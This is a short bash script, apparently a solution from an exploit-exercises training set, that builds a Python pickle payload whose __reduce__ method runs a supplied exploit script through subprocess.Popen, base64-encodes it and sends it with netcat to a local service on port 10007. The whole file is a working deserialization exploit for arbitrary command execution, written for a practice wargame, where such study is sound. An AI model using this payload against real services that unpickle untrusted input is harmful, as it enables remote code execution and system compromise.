#!/bin/bash -eu
# Copyright (c) 2015, Heye Voecking <heye.voecking+exploit-exercises.com@gmail.com>

source $HOME/common/setup-exploit

PICKLE=$(mktemp --suffix=.py)
registerTrap "rm $PICKLE" EXIT

# Thanks to https://blog.nelhage.com/2011/03/exploiting-pickle/
cat <<EOF > $PICKLE
#!$(which python)

import cPickle
import subprocess
import base64

class RunExploit(object):
  def __reduce__(self):
    return (subprocess.Popen, (('$EXPLOIT_SCRIPT',),))

print base64.b64encode(cPickle.dumps(RunExploit()))

print "\n"

for i in range(4096):
  print "."

EOF

chmod +x $PICKLE
$PICKLE | nc localhost 10007

exploit_with_binary
